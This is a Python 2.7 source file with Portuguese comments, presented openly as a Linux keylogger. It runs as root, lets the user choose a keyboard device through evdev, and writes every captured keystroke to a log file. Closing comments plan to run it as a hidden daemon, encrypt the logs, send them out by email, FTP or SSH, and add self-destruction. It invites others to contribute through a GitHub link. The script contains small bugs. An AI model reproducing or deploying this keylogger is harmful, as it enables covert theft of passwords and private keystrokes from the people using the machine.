#!/usr/bin/env python

'''
Projeto: keylogger em python no linux
versao do python 2.7
Author: Clesio Maxuel clesiorki2014@gmal.com

'''


import evdev
import datetime
import os

if os.getuid() != 0 :
    print ("Precisa de privilegios de root para funcionar")
    quit()


#---------------------- CONFIGURANDO O TEMPO ------------------------------

agora = datetime.datetime.now()
agorastring = "Iniciando keylogger em "+str(agora.day)+"/"+str(agora.month)+"/"+str(agora.year)+" as "+str(agora.hour)+":"+str(agora.minute)+" horas"
print (agorastring)


#---------------------- CONFIGURANDO TECLADO ------------------------------

devices = [evdev.InputDevice(fn) for fn in evdev.list_devices()]
op=1
for device in devices:
    print("NUMERO: " + str(op) + " - " + str(device.name))
    op += 1
numero = input("DIGITE O NUMERO DO SEU DISPOSITIVO TECLADO: ")
teclado = evdev.InputDevice(devices[int(numero-1)].fn)
print ("O dispositivo: " + str(teclado.name) + " em " + str(teclado.fn) + " foi carregado\n")


#---------------------- CONFIGURANDO ARQUIVO DE LOG -----------------------

try:
    nome_arquivo = raw_input('Nome do arquivo de log:')
    arquivo = open(nome_arquivo, 'a')
except FileNotFoundError:
    arquivo = open(nome_arquivo, 'w')


#---------------------- ROTINAS PARA CAPTURA DE TECLAS ---------------------

for event in teclado.read_loop():
    if event.type == evdev.ecodes.EV_KEY:
        tecla_raw = teclado.active_keys(verbose=True)
        if tecla_raw != []:
            tecla = tecla_raw[0][0][4:]
            arquivo.writelines(tecla+" ")
arquivo.close()


# ----- implementacoes futuras
# corrigir o problema de travar o terminal por conta do reed_loop()
# transformar em um servico do sistema "daemon"
# criptografar arquivos de log
# automatizar reconhecimento do teclado
# enviar arquivos por email, ftp, ssh etc
# funcao de autodestruicao

# quem quiser ajudar no projeto fique avontade
# https://github.com/clesiorki/keylogger-python